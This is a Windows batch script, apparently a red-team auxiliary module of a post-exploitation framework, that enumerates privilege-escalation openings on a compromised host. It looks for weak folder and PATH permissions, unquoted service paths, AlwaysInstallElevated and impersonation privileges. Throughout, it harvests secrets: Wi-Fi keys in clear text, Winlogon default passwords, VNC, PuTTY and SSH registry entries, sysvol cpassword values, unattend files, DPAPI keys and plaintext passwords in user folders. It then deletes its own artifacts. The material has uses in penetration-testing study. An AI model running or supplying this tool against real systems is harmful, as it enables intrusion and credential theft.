@echo off
:: Version: v1.2.12
:: Dependencies: icacls\cacls {native}
:: Author: @r00t-3xp10it (ssa red team @2022)
:: Helper: Auxiliary module of @Meterpeter v2.10.11 - FindEop module
:: Methodology: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#windows---privilege-escalation
:: ----
TITLE FindEop v1.2.12 {SSA RedTeam @2022}


:: Local variables
SET LocalPath=%cd%
SET BatVersion=v1.2.12
:: mode con:cols=130 lines=25
:: Spirit of Heaven, Goddess of Fire and Life!
echo.
echo                                                         \  /
echo                                                         (())
echo                                                         ,~L_
echo                                                        2~~ ^<\
echo                                                        )^>-\y(((GSSsss _%BatVersion%
echo                       __________________________________)v_\__________________________________
echo                      (_// / / / (///////\3__________((_/      _((__________E/\\\\\\\) \ \ \ \\_)
echo                        (_/ / / / (////////////////////(c  (c /^|\\\\\\\\\\\\\\\\\\\\) \ \ \ \_)
echo                         "(_/ / / /(/(/(/(/(/(/(/(/(/(/\_    /\)\)\)\)\)\)\)\)\)\)\ \ \ \_)"
echo                            "(_/ / / / / / / / / / / / /|___/\ \ \ \ \ \ \ \ \ \ \ \ \_)"
echo                               "(_(_(_(_(_(_(_(_(_(_(_(_[_]_|_)_)_)_)_)_)_)_)_)_)_)_)"
echo                                                        ^|    \
echo                                                       / /   /___
echo                                                      / /         '~~~~~__.
echo                                                      \_\_______________\_'_?
echo                                          Spirit of Heaven, Goddess of Fire and Life
echo. && echo. && echo.
:: Banner Timeout
timeout /T 2 >nul


:: List system info
echo SYSTEM INFORMATION
echo ------------------
systeminfo > systeminfo.txt
type systeminfo.txt|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:"
del /f systeminfo.txt
echo.
echo.

:: List UAC settings
echo USER ACCOUNT CONTROL
echo --------------------                   
powershell -C "$RawPolicyKey = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system';$UacStatus = (Get-Itemproperty -path $RawPolicyKey).EnableLUA;$ConsentPromptBehaviorUser = (Get-Itemproperty -path "$RawPolicyKey").ConsentPromptBehaviorUser;$ConsentPromptBehaviorAdmin = (Get-Itemproperty -path "$RawPolicyKey").ConsentPromptBehaviorAdmin;If($UacStatus -eq 0){Write-Host 'UAC Status   :             Disabled'}ElseIf($UacStatus -eq 1){Write-Host 'UAC Status   :             Enabled'};If($ConsentPromptBehaviorAdmin -eq 5 -and $ConsentPromptBehaviorUser -eq 3){Write-Host 'UAC Settings :             Notify Me'}ElseIf($ConsentPromptBehaviorAdmin -eq 0 -and $ConsentPromptBehaviorUser -eq 0){Write-Host 'UAC Settings :             Never Notify'}ElseIf($ConsentPromptBehaviorAdmin -eq 2 -and $ConsentPromptBehaviorUser -eq 3){Write-Host 'UAC Settings :             Allways Notify'}"
echo.
echo.

:: List UserPrivs
echo USER INFORMATION
echo ----------------
powershell -C "whoami /user|Format-Table|Out-String -Stream|Select-Object -Skip 4"
echo.
echo.

:: List Local Groups
echo LIST LOCAL GROUPS
echo -----------------
powershell -C "Get-LocalGroup|Select-Object Name,SID,PrincipalSource|Format-table -AutoSize|Out-String -Stream|Select-Object -Skip 1"

:: List HotFixes
echo LIST HOTFIXES INSTALLED
echo -----------------------
powershell -C "Get-HotFix|Select-Object Description,HotFixID,InstalledBy,InstalledOn|Format-table -AutoSize|Out-String -Stream|Select-Object -Skip 1|Select-Object -SkipLast 1"
echo.

:: List Privileges
echo PRIVILEGES INFORMATION
echo ----------------------
powershell -C "whoami /priv|Format-Table|Out-String -Stream|Select-Object -Skip 4"
echo.
echo.

:: Abusing the golden privileges
echo JUICY POTATO GOLDEN PRIVS
echo -------------------------
powershell -C "$juicy = whoami /priv|findstr /i /C:'SeImpersonatePrivileges'|findstr /i /C:'Enabled';If(-not($juicy)){write-host 'ERROR: None vulnerable privileges found.'}Else{echo $juicy}"
echo.
echo.

:: Environement Paths
echo ENVIRONEMENT PATHS
echo ------------------
powershell -C "($Env:Path) -split ';'"
echo.

:: Check icacls
where /q icacls
IF ERRORLEVEL 1 (
    echo 'icacls is missing, performing checks using cacls for older versions of Windows'
    FOR /F "tokens=* USEBACKQ" %%F IN (`where cacls`) DO (SET cacls_exe=%%F)
) ELSE (
    FOR /F "tokens=* USEBACKQ" %%F IN (`where icacls`) DO (SET cacls_exe=%%F)
)

:: PATH variable entries permissions
echo PATH VARIABLE ENTRIES PERMISSIONS
echo Place exe or DLL to exec instead of legitimate
echo ----------------------------------------------
del /f EnvironementPaths.log  >nul 2>&1
del /f VulnDataBase.log  >nul 2>&1
for %%A in (%Path%) do (echo %%A >> EnvironementPaths.log)
FOR /F "tokens=* USEBACKQ" %%F IN (`type EnvironementPaths.log`) DO (cmd.exe /c %cacls_exe% "%%~F" 2>nul | findstr /i "(F) (M) (W)" | findstr /i ":\\ everyone users todos %username%" | findstr /V "TrustedInstaller" >> VulnDataBase.log)
:: Read report file and delete artifacts left behind
type VulnDataBase.log
del /f /q EnvironementPaths.log
del /f /q VulnDataBase.log
echo.
echo.

:: User Directorys with full or modify permisions
echo DIRECTORYS WITH FULL OR MODIFY PERMISSIONS
echo ------------------------------------------
:: Get system default language installed to build variables
FOR /F "tokens=*" %%a in ('powershell -C "([CultureInfo]::InstalledUICulture).Name"') do SET OUTPUT=%%a
:: This function supports 'pt-PT' or 'en-ENG' langs, change vars 'token=' +'viriato=' for diferent lang
if %OUTPUT%==pt-PT (
   :: pt-PT (portugal) language set
   set token=Utilizadores && set viriato=Todos
) ELSE (
   :: Default language set if not pt-PT
   set token=Users && set viriato=Everyone
)

:: Scan User Directorys for weak permissions
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "%viriato%" 
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "%viriato%" 
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "%viriato%" 
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "%viriato%" 
%cacls_exe% "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "%viriato%" 
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "%viriato%" 
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Users\*" 2>nul | findstr "(F)" | findstr "%viriato%" 
%cacls_exe% "C:\Users\*" 2>nul | findstr "(F)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Users\*" 2>nul | findstr "(M)" | findstr "%viriato%" 
%cacls_exe% "C:\Users\*" 2>nul | findstr "(M)" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Documents and Settings\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\%token%" 
%cacls_exe% "C:\Users\*" /T 2>nul | findstr ":F" | findstr "BUILTIN\%token%" 
echo.
echo.

:: List Stored cmdkey creds
echo STORED CMDKEY CREDENTIALS (runas)
echo ---------------------------------
powershell -C "cmdkey /list|Format-Table|Out-String -Stream|Select-Object -Skip 3"
echo.

:: List Unquoted Service Paths
echo UNQUOTED SERVICE PATHS
echo ----------------------
sc query state= all > scoutput.txt
findstr "SERVICE_NAME:" scoutput.txt > Servicenames.txt
FOR /F "tokens=2 delims= " %%i in (Servicenames.txt) DO @echo %%i >> services.txt
FOR /F %%i in (services.txt) DO @sc qc %%i | findstr "BINARY_PATH_NAME" >> path.txt
:: Parsing data created by query
find /v """" path.txt > unquotedpaths.txt
sort unquotedpaths.txt|findstr /i /v C:\WINDOWS|findstr /V /C:"---------- PATH.TXT" > ParsingData.txt
powershell -C "$HenryTheNavigator = Get-Content -Path ParsingData.txt|?{$_ -ne ''};(echo $HenryTheNavigator) -replace '        BINARY_PATH_NAME   :','BINARY_PATH_NAME  :'"
:: Clean artifacts left behind
del /f unquotedpaths.txt
del /f Servicenames.txt
del /f ParsingData.txt
del /f services.txt
del /f scoutput.txt
del /f path.txt
echo.
echo.

:: List Programs that run at startup
echo PROGRAMS THAT RUN AT STARTUP
echo ----------------------------
powershell -C "Get-CimInstance Win32_StartupCommand|Select-Object Name,command,Location,User|Format-List|Out-String -Stream|Select-Object -Skip 2|Select-Object -SkipLast 2"
echo.

:: List tasks running under system privs
echo TASKS RUNNING UNDER SYSTEM PRIVILEGES
echo -------------------------------------
powershell -C "tasklist /fi 'username eq system'|Format-Table|Out-String -Stream|Select-Object -Skip 1"
echo.
echo.

:: Link running processes to started services
echo LINK RUNNING PROCESSES TO STARTED SERVICES
echo ------------------------------------------
powershell -C "(tasklist /SVC|Format-Table|Out-String -Stream|Select-Object -Skip 1) -replace '=','-'"
echo.
echo.

:: Is RDP access Enabled?
echo IS RDP ACCESS ENABLED?
echo ----------------------
powershell -C "$TESTREGISTRY = reg query 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections | findstr /C:'0x0';If($TESTREGISTRY){Write-Host 'RDP Connections: Allowed REG_DWORD 0x0 => [VULNERABLE::T1021]'}Else{Write-Host 'RDP Connections: NotAllowed REG_DWORD 0x1.'}"
echo.
echo.


:: REGISTRY SEARCH


:: Powershell engine settings
echo DETECTING POWERSHELL ENGINE
echo ---------------------------
powershell -C $PSDefaultVersion = (Get-Host).Version.ToString();write-host "PowershellDefault : $PSDefaultVersion"
powershell -C "$TESTREGISTRY = reg query 'HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine' /v PowerShellVersion | findstr /C:'2.0';If($TESTREGISTRY){Write-Host 'PowerShellVersion : 2.0 => [VULNERABLE::T1562]'}Else{Write-Host 'ERROR: The system was unable to find the specified registry key or value.'}"
powershell -C "(reg query HKLM\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine /v PowerShellVersion | findstr /C:'5.') -replace '    PowerShellVersion    REG_SZ   ','PowerShellVersion :'"
powershell -C "(reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging | findstr /C:'0x1') -replace '    EnableModuleLogging    REG_DWORD    0x1','EnableModuleLogging : True'"
powershell -C "(reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging | findstr /C:'0x1') -replace '    EnableScriptBlockLogging    REG_DWORD    0x1','EnableScriptBlockLogging : True'"
echo.
echo.

:: Its LAPS installed?
echo ITS LAPS INSTALLED?
echo --------------------
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
echo.
echo.

:: List unattend.xml files
echo LIST UNATTEND.XML FILES EXISTENCE
echo Creds are stored in base64 and can be decoded manually.
echo -------------------------------------------------------
powershell -C "findstr /S /I cpassword \\$FQDN\sysvol\$FQDN\policies\*.xml"
powershell -C "(Get-ChildItem $Env:WINDIR\unattend.xml -EA SilentlyContinue|Select-Object *).FullName"
powershell -C "(Get-ChildItem $Env:WINDIR\Panther\Unattend.xml -EA SilentlyContinue|Select-Object *).FullName"
powershell -C "(Get-ChildItem $Env:WINDIR\system32\sysprep.inf -EA SilentlyContinue|Select-Object *).FullName"
powershell -C "(Get-ChildItem $Env:WINDIR\Panther\Unattend\Unattend.xml -EA SilentlyContinue|Select-Object *).FullName"
powershell -C "(Get-ChildItem $Env:WINDIR\system32\sysprep\sysprep.xml -EA SilentlyContinue|Select-Object *).FullName"
echo.
echo.

:: [System.IO.Directory]::GetFiles(“\\.\pipe\”)
:: Check for Named Pipes. This can be exploited to obtain the privileges of a process connecting to them.

:: List AlwaysInstallElevated
echo REGISTRY ALWAYSINSTALLELEVATED
echo ------------------------------
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
echo.
echo.

:: Inject fake updates into wsus traffic
echo INJECT 'fake' UPDATES INTO NON-SLL WSUS TRAFFIC
echo ------------------------------------------------
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v wuserver | findstr /i /C:"http://"
echo.
echo.

:: Registry raw credentials search
echo REGISTRY RAW CREDENTIALS SEARCH
echo -------------------------------
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"|findstr "LastUsedUsername DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4 /v password"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\OpenSSH\Agent\Keys"
reg query "HKCU\Software\TightVNC\Server"
echo.
echo.

:: LogonCredentialsPlainInMemory
echo LOGON_CREDENTIALS_PLAIN_IN_MEMORY WDIGEST
echo -----------------------------------------
powershell -C "(reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential | findstr /C:'0x1') -replace '    UseLogonCredential    REG_DWORD    0x1','UseLogonCredential : vulnerable'"
echo.
echo.

:: Get Domain Controllers
echo GET DOMAIN CONTROLLERS
echo ----------------------
powershell -C "$DomainControler = $Env:USERDOMAIN;echo ::DCName::[$DomainControler];nltest /DCNAME:$DomainControler|Out-Null;nltest /DSGETDC:$DomainControler|Out-Null;nltest /DCLIST:$DomainControler|Out-Null"
echo.
echo.

:: Kerberos Tickets
echo KERBEROS TICKETS
echo ----------------
powershell -C "klist|?{$_ -ne ''}"
echo.
echo.

:: DPAPI MASTER KEYS
:: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords
echo DPAPI MASTER KEYS
echo -----------------
powershell -C "Get-ChildItem -Path %appdata%\Microsoft\Protect -EA SilentlyContinue|Select-Object Name,LastWriteTime|Format-Table|Out-String -Stream|Select -Skip 1|Select -SkipLast 1"
echo Use Mimikatz 'dpapi::cred' module with (/masterkey) to decrypt
dir /b /a %appdata%\Microsoft\Credentials\ 2>nul
dir /b /a %localappdata%\Microsoft\Credentials\ 2>nul
echo.
echo.

:: Wifi Credentials
echo STORED WIFI CREDENTIALS
echo -----------------------
del /f WifiKeys.log  >nul 2>&1
for /f "tokens=4 delims=: " %%a in ('netsh wlan show profiles ^| find "Profile "') do (netsh wlan show profiles name=%%a key=clear | findstr "SSID Cipher Content" | find /v "Number" >> WifiKeys.log)
type WifiKeys.log
del /f WifiKeys.log
echo.
echo.

:: hardcoded credentials in text files
echo HARDCODED CREDS IN CLEARTEXT
echo ----------------------------
dir %userprofile%\Desktop >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%userprofile%\Desktop'
   cd %userprofile%\Desktop && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.ini >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] NotFound : '%userprofile%\Desktop'
)
dir %userprofile%\Documents >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%userprofile%\Documents'
   cd %userprofile%\Documents && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.log *.xml >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] NotFound : '%userprofile%\Documents'
)
dir %tmp% >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%tmp%'
   cd %tmp% && findstr /s /I /C:"Username:" /s /I /C:"User:" /s /I /C:"user name=" /s /I /C:"pass:" /s /I /C:"Password:" /s /I /C:"Password=" *.txt *.log *.xml *.ini >> %tmp%\cleartext.txt
) ELSE (
   echo [DIRECTORY] NotFound : '%tmp%'
)
IF EXIST %tmp%\cleartext.txt (
   type %tmp%\cleartext.txt
   :: Clean artifacts left behind
   del /f %tmp%\cleartext.txt
)
:: return to pwd
cd %LocalPath%
echo.
echo.


:: DEBUG FUNCTION
:: Change directory to %tmp% to run sherlock.ps1
::cd %tmp%
::exit